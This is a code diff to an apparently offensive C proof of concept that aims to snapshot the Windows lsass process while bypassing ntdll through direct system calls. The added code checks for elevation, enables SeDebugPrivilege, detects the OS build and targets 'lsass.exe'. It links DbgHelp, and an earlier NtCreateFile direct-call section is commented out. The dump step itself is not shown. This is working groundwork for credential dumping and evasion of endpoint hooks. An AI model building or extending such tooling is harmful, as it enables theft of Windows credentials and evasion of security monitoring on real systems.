@@ -10,8 +10,10 @@ Disclosure timeline from @matteomalvica
 02.12.2019: 30 days of non-disclose period over. Findings published
 
 Building on this work this is an attempt to completely bypass ntdll to capture a snapshot of lsass.
-1. Get PID for lsass
-2. DebugPrivs (must be admin??)
+1. Is x64
+2. Must be admin
+3. SeDebug()
+4. Get PID
 */
 
 #include "pch.h"
@@ -20,12 +22,67 @@ Building on this work this is an attempt to completely bypass ntdll to capture a
 #include <stdio.h>
 #include "DirectCallPOC.h"
 #include <strsafe.h>
+#include <intrin.h>
+#include <DbgHelp.h>
+
+#pragma comment (lib, "Dbghelp.lib")
+
 
 //Because MS makes string handling a nighmare :)
 #undef  _UNICODE
 #define _UNICODE
 #undef  UNICODE
 #define UNICODE
+
+//Check credentials
+BOOL IsElevated()
+{
+	BOOL fRet = FALSE;
+	HANDLE hToken = NULL;
+
+	if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken))
+	{
+		TOKEN_ELEVATION Elevation = { 0 };
+		DWORD cbSize = sizeof(TOKEN_ELEVATION);
+		if (GetTokenInformation(hToken, TokenElevation, &Elevation, sizeof(Elevation), &cbSize))
+		{
+			fRet = Elevation.TokenIsElevated;
+		}
+	}
+	if (hToken)
+	{
+		CloseHandle(hToken);
+	}
+	return fRet;
+}
+
+//Get SeDebug
+
+BOOL SetDebugPrivilege() {
+	HANDLE hToken = NULL;
+	TOKEN_PRIVILEGES TokenPrivileges = { 0 };
+
+	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY | TOKEN_ADJUST_PRIVILEGES, &hToken)) {
+		return FALSE;
+	}
+
+	TokenPrivileges.PrivilegeCount = 1;
+	TokenPrivileges.Privileges[0].Attributes = TRUE ? SE_PRIVILEGE_ENABLED : 0;
+
+	LPWSTR lpwPriv = (LPWSTR)"SeDebugPrivilege";  //Taky but easy
+	if (!LookupPrivilegeValueW(NULL, (LPCWSTR)lpwPriv, &TokenPrivileges.Privileges[0].Luid)) {
+		CloseHandle(hToken);
+		return FALSE;
+	}
+
+	if (!AdjustTokenPrivileges(hToken, FALSE, &TokenPrivileges, sizeof(TOKEN_PRIVILEGES), NULL, NULL)) {
+		CloseHandle(hToken);
+		return FALSE;
+	}
+
+	CloseHandle(hToken);
+	return TRUE;
+}
 
 void ErrorExit(LPTSTR lpszFunction)
 {
@@ -62,6 +119,73 @@ void ErrorExit(LPTSTR lpszFunction)
 
 int main()
 {
+	//We are after lsass
+	LPCWSTR lpwProcName = L"lsass.exe";
+
+	//Are we on a 64 bit OS
+	if (sizeof(LPVOID) != 8)
+	{
+		wprintf(L"[!] This only works on x64 version of Windows. \n");
+		exit(1);
+	}
+
+	//Are we Admin
+	if (!IsElevated())
+	{
+		wprintf(L"[!]Elevated privliges are required to run this tool. \n");
+	}
+
+	SetDebugPrivilege();
+
+
+	PWIN_VER_INFO pWinVerInfo = (PWIN_VER_INFO)calloc(1, sizeof(WIN_VER_INFO));
+
+	// First set OS Version/Architecture specific values
+	OSVERSIONINFOEXW osInfo;
+	LPWSTR lpOSVersion;
+	osInfo.dwOSVersionInfoSize = sizeof(osInfo);
+
+	_RtlGetVersion RtlGetVersion = (_RtlGetVersion)
+		GetProcAddress(GetModuleHandle(L"ntdll.dll"), "RtlGetVersion");
+	if (RtlGetVersion == NULL) {
+		return FALSE;
+	}
+
+	wprintf(L"[1] Checking OS version details:\n");
+	RtlGetVersion(&osInfo);
+	swprintf_s(pWinVerInfo->chOSMajorMinor, _countof(pWinVerInfo->chOSMajorMinor), L"%u.%u", osInfo.dwMajorVersion, osInfo.dwMinorVersion);
+	pWinVerInfo->dwBuildNumber = osInfo.dwBuildNumber;
+
+
+	// Now create os/build specific syscall function pointers.
+	if (_wcsicmp(pWinVerInfo->chOSMajorMinor, L"10.0") == 0) {
+		lpOSVersion = (LPWSTR)"10 or Server 2016";
+		wprintf(L"	[+] Operating System is Windows %ls, build number %d\n", lpOSVersion, pWinVerInfo->dwBuildNumber);
+	}
+	else if (_wcsicmp(pWinVerInfo->chOSMajorMinor, L"6.3") == 0) {
+		lpOSVersion = (LPWSTR)"8.1 or Server 2012 R2";
+		wprintf(L"	[+] Operating System is Windows %ls, build number %d\n", lpOSVersion, pWinVerInfo->dwBuildNumber);
+	}
+	else {
+		wprintf(L"	[!] OS Version not supported.\n\n");
+		exit(1);
+	}
+
+	wprintf(L"[2] Checking Process details:\n");
+
+	_RtlInitUnicodeString RtlInitUnicodeString = (_RtlInitUnicodeString)
+		GetProcAddress(GetModuleHandle(L"ntdll.dll"), "RtlInitUnicodeString");
+	if (RtlInitUnicodeString == NULL) {
+		return FALSE;
+	}
+
+	RtlInitUnicodeString(&pWinVerInfo->ProcName, lpwProcName);
+
+
+	/*
+	*******************Initial POC test stop here**************************
+	
+
 	//Alias NtCreateFile to our assembly code for this version of Windows 10
 	NtCreateFile = &NtCreateFile10;
 	
@@ -108,7 +232,7 @@ int main()
 	if (!result)
 	{
 		ErrorExit(LFunction);
-	}	
+	}*/	
 
 }
 
